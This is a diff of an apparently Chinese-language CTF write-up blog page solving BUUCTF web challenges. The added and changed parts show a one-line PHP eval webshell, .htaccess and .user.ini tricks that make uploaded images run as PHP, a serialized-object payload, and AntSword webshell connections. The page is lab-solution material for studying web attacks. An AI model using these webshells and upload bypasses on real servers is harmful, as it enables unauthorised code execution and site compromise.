@@ -24,7 +24,7 @@
 <meta property="og:description" content="BUUCTF[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagggg 解析source.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-04-14T13:42:14.577Z">
-<meta property="article:modified_time" content="2024-04-16T09:25:43.148Z">
+<meta property="article:modified_time" content="2024-04-16T13:13:38.356Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k words
+          2.8k words
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          23 mins
+          24 mins
         
       </span>
     
@@ -435,14 +435,21 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p>?select&#x3D;O:4:”Name”:3 {s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
 <h2 id="极客大挑战-2019-Knife-一句话木马、代码执行"><a href="#极客大挑战-2019-Knife-一句话木马、代码执行" class="headerlink" title="[极客大挑战 2019]Knife(一句话木马、代码执行)"></a>[极客大挑战 2019]Knife(一句话木马、代码执行)</h2><h5 id="Way1（代码执行）"><a href="#Way1（代码执行）" class="headerlink" title="Way1（代码执行）"></a>Way1（代码执行）</h5><p>显示 eval($_POST[“Syc”]);<br>POST: Syc&#x3D;var_dump(scandir(‘&#x2F;‘));—查看源代码 发现flag</p>
 <h5 id="Way2（蚁剑）"><a href="#Way2（蚁剑）" class="headerlink" title="Way2（蚁剑）"></a>Way2（蚁剑）</h5><p>复制URL 密码：Syc  找flag文件</p>
-<h2 id="MRCTF2020-你传你🐎呢-上传木马-抓包改后缀-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-上传木马-抓包改后缀-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(上传木马+抓包改后缀+.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(上传木马+抓包改后缀+.htaccess绕过)</h2><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p>
+<h2 id="MRCTF2020-你传你🐎呢-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(.htaccess绕过)</h2><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p>
 <p>先上次1.png   &#x2F;&#x2F;与后面的png文件名一致</p>
 <p>尝试.htaccess</p>
-<p>内容：<br>&lt;FilesMatch “1.png”&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p>
+<p>内容：<br><code>&lt;FilesMatch &quot;1.png&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p>
 <p>抓包&#x3D;&#x3D;&gt;Content-Type: image&#x2F;png</p>
 <p>复制网址：&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>.htaccess</strong></p>
 <p>改为&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>1.png</strong></p>
 <p>踩坑：<em>这里要把.htaccess改为1.png，因为密码cmd是对应的1.png</em></p>
+<h2 id="SUCTF-2019-CheckIn-user-ini绕过"><a href="#SUCTF-2019-CheckIn-user-ini绕过" class="headerlink" title="[SUCTF 2019]CheckIn(.user.ini绕过)"></a>[SUCTF 2019]CheckIn(.user.ini绕过)</h2><p>illegal suffix! 尝试不同文件上传 发现只有jpg回显回显&lt;? in contents!</p>
+<p>看来只能是jpg 然后需要绕过 &lt;?  :<code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;scirpt&gt;</code></p>
+<p>需要把jpg当做PHP文件执行，尝试.htaccess文件，然后还是不行： 回显exif_imagetype:not image!</p>
+<p>这时想到**.user.ini**绕过：</p>
+<p><code>GIF89a</code><br><code>auto_prepend_file=a.jpg</code>&#x2F;&#x2F;a.jpg要与上传的jpg文件名称相同</p>
+<p>重新尝试：先.user.ini 后 a.jpg </p>
+<p>蚁剑连接，注意最后是&#x2F;index.php———使用的是auto_prepend_file，在主文件之前就已经自动解析文件名了，所以index.php主文件在最后面，而不是a.jpg</p>
 <h2 id="极客大挑战-2019-BuyFlag（数组绕过长度限制）"><a href="#极客大挑战-2019-BuyFlag（数组绕过长度限制）" class="headerlink" title="[极客大挑战 2019]BuyFlag（数组绕过长度限制）"></a>[极客大挑战 2019]BuyFlag（数组绕过长度限制）</h2><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!! 	 							</p>
 <p>源代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>	~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>	&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
